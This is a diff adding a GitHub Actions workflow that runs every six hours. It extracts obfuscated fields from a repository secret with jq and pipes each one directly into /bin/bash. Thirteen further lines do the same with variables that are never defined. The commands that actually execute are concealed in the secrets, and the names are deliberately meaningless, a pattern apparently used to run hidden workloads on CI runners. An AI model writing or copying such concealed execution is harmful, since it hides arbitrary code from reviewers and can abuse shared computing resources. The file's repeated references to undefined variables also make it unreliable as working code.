@@ -1,0 +1,29 @@
+name: sunli19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sunli19871010
+        env:
+          frwq6: ${{ secrets.frwq6 }}
+        run: |
+          echo $frwq6 | jq -r .o59469 | /bin/bash
+          echo $p6 | jq -r .oxz78877 | /bin/bash
+          echo $t13 | jq -r .gbca8 | /bin/bash
+          echo $nahjp528 | jq -r .uubec979 | /bin/bash
+          echo $jszn21575 | jq -r .vf49 | /bin/bash
+          echo $dlvf066 | jq -r .azs435 | /bin/bash
+          echo $camsc16 | jq -r .s81592 | /bin/bash
+          echo $mlw93 | jq -r .teyop118 | /bin/bash
+          echo $kjzyw45377 | jq -r .xa89107 | /bin/bash
+          echo $ioj07 | jq -r .o242 | /bin/bash
+          echo $nvat52 | jq -r .onrxj1667 | /bin/bash
+          echo $swl24 | jq -r .ed869 | /bin/bash
+          echo $ykdpl2511 | jq -r .kkhv5 | /bin/bash
+          echo $du95295 | jq -r .dxdsb55909 | /bin/bash
+
